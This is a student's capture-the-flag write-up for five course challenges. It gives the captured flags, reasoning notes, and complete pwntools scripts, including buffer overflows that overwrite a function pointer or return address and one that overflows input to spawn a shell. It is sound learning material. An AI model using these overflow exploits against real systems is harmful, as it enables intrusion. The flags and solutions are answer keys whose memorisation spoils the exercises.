intro
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMS1pbnRybyIsImlwIjoiMTQ0LjEzNi4yOC4zNiIsInNlc3Npb24iOiI5OWEyZmMzMy05OGNiLTQxZjEtYjlhMC1iZDJhNTk0Njk5Y2MifQ.o3D1DYjJPx4Lq4qyF4CT0R0o3bTPKrTq3hrfRZ1Fvx8}


General overview of problems faces
--------------------------------------
Complete newb at this.
I thought stripping 0x1337 meant finding whatever was stored
in that address. I used binaryninja to figure out that
0x1337 was meant to be converted to decimal. I saw 
if (eax_4 == arg1), and arg1 was 0x1337 when it was
used as an argument in getDec().
Ans: 4919

Math - used a hexadecimal calculator.
Ans: 0x1234

Sending 0x1137 in little endian?
Searched online, used an online coverter to get 14099, but it shows that I only sent 14 (first two digits)?
Asked on slack, used p32(0x1337) to convert to little endian.
Ans: 7/x13

I realise at this stage you could automate and not use hardcoded answers. I'll try
and figure that out later.

xV4\x12 to decimal
Used u32(b'xV4\x12'), converted to string and sent the line.
Convert to hex.
Used hex(), converted to string and sent the line.

Math 12835+12835
Sent the line using str(12835+12835) as argument for p.sendline().

Secret flag
Saw 'password' when using binaryninja, used it and it worked.

Actual flag.
Connected to the server, used ls. I saw a file called flag and I used 'cat flag'.

Script/Command used
-------------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './intro'

PROGNAME = exe
REMOTE = "comp6447.wtf"
REMOTEPORT = 26949
global p
global e
global global_timeout

e = ELF(PROGNAME)


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE,REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#Strip out this address: {0x1337}
p.recvuntil(b'0x1337', drop=True)
p.sendline(b'4919')
#Send it back to me in hex form MINUS 0x103!
p.recvuntil(b'0x103!', drop=True)
p.sendline(b'0x1234')
# Send me 0x1337 in little endian form!
p.recvuntil(b'form!', drop=True)
l_end = p32(0x1337)
log.info(f"Little endian form is {l_end}")
p.sendline(l_end)
# Strip out this little endian adress xV4\x12
# Now send it back to me in decimal form!
p.recvuntil(b'form', drop=True)
dec_form = u32(b'xV4\x12')
log.info(f"dec form is {dec_form}")
p.sendline(str(dec_form))
#Send me it in hex form!
p.recvuntil(b'hex form!')
p.sendline(hex(dec_form))
#What is 12835 + 12835?
p.recvuntil(b'12835?')
p.sendline(str(12835+12835))
#What is the secret flag hidden in this file?
p.recvuntil(b'file?')
p.sendline(b'password')
p.interactive()
```

too-slow
================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMS10b28tc2xvdyIsImlwIjoiMTQ0LjEzNi4yOC4zNiIsInNlc3Npb24iOiJhZDhkZWI0Zi0zNzQ1LTRmMWYtYWIxYy1mOGQzYTY5ZDgxYTQifQ.N1AlH0HDx-zrkZdoa4kju14qamuHYqqfJXasTepPunE}

General overview of problems
------------------------------------------------
Math problems were given in the format of "%d + %d = "
Multiple math problems
Program used an alarm timer

Using binaryninja, I saw a while loop for x >= 9
Used pwntools to create a script to beat the timer.
Used some functions to split the math problem format.

While loop using the same conditions as when using binaryninja to diassemble the program.
Used this script to beat the timer.
Broke up the math problem format using recvuntil(), .split() to get the numbers necessary to send the solution.
Made sure to account for the "Correct Answer!" for each correct solution.

Script/Command used
------------------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './too-slow'

PROGNAME = exe
REMOTE = "comp6447.wtf"
REMOTEPORT = 28958
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
x = 0
#Solve the following math problems before time runs out! (random)
p.recvuntil(b'out!\n', drop=True)
while x <= 9:
    math_prob = p.recvuntil(b' = ', drop=True)
    word_array = math_prob.split()
    num1 = int(word_array[0])
    num2 = int(word_array[2])
    solution = num1+num2
    log.info(f'num1 = {num1}, num2 = {num2}, sol = {solution}')

    p.sendline(str(solution))
    #Correct Answer!
    p.recvuntil(b'Answer!', drop=True)
    x += 1


p.interactive()
```

jump
===================================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMS1qdW1wIiwiaXAiOiIxNDQuMTM2LjI4LjM2Iiwic2Vzc2lvbiI6IjQwNDQxNDRiLTcwZTUtNDA5Ni1hYWI5LWJlNDdjZTYxM2UyOSJ9.3jb8XyW43DCh9mCZEwImRZ0uM8SUq6xQZNpcVZ0gcCg}
General overview of problems faced
------------------------------------------------------------
Don't know how to figure out how many bytes the buffer is initialised to without looking at source code. (From source code, its 64)
Have to know how many characters to input before overflowing to the region where the lose address space is. From looking at the source code, since buffer and the pointer to a function is next to each other, we just need to overflow the normal 64 bytes.

Need to use p32() since our system uses little endian for addresses.

Script/Command used
-----------------------------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './jump'

PROGNAME = exe
REMOTE = "comp6447.wtf"
REMOTEPORT = 28872
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#The winning function is at 0x8048536
#Do you remember how function pointers work ?
p.recvuntil(b'?', drop=True)
payload = b'a' * 64 + p32(0x8048536)
p.sendline(payload) #win
p.interactive()
```

blind
===============================================================
Flag:FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMS1ibGluZCIsImlwIjoiMTQ0LjEzNi4yOC4zNiIsInNlc3Npb24iOiIxOGI2ZDIwZS1jMzNjLTQ3MjEtYmEyMS0zNGM3OThmMTUzZDkifQ.vUjgxcC1gz79PDVq-iVBC0R2k6940T5kBhBdu4FpsM0}

General overview of problems faced
---------------------------------------------------------
Mostly same problems from jump, but now I need to find the address myself. I used binaryninja to find the adresss where win() was.
Buffer size is 64, and we need 8 more bytes to reach the space where the return
address is. We change this to 0x80484d6, so we return to that function.
I brute forced to find out 8 extra bytes were needed to reach the return address space.
Looking at pwngdb, I can see esp is added for 4 or 8. I took at a guess at each of these and 8 turned out to the key number.
Will have to confirm and figure this out.
Script/Command used
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './blind'

PROGNAME = exe
REMOTE = "comp6447.wtf"
REMOTEPORT = 20677
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#This is almost exactly the same as jump...
p.recvuntil(b'jump...', drop=True)
#Address at 0x80484d6, courtesy of binaryninja
payload = b'a' * (64+8) + p32(0x80484d6)
p.sendline(payload) #Instead of returning to main, go to win()
p.interactive()
```

bestsecurity
===============================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMS1iZXN0c2VjdXJpdHkiLCJpcCI6IjE0NC4xMzYuMjguMzYiLCJzZXNzaW9uIjoiM2NhMjBmMmYtYmNkZi00ZWY1LWI3ZDAtZWE1M2UzNmU2NTgwIn0.rnn90iqj62lvPE0f9GZeJGQuonJzmHDT6pMhBNSEGl4}

General overview of problems faced
---------------------------------------------------------
Looking at binaryninja, it looks like we need to overflow and write in "1234" to satisfy the strncmp() condition to pop the shell.
I couldn't figure out what the buffer size was, but I had an idea. I used pwntools to copy "1234" multiple times. I knew strncmp would only check the first 4 characters. So if it didn't work, I would add a character at the beginning to shift it. Fortunately, this wasn't needed.
Copying "1234" resulting in some EOFs when I used 200 and 100. 50 was the key number to successfuly pop the shell.
Script/command used
------------------------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './bestsecurity'

PROGNAME = exe
REMOTE = "comp6447.wtf"
REMOTEPORT = 20478
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#AAAAw, yeah...
p.recvuntil(b'...', drop=True)
payload = b'1234' * 50
p.sendline(payload)

p.interactive()
```




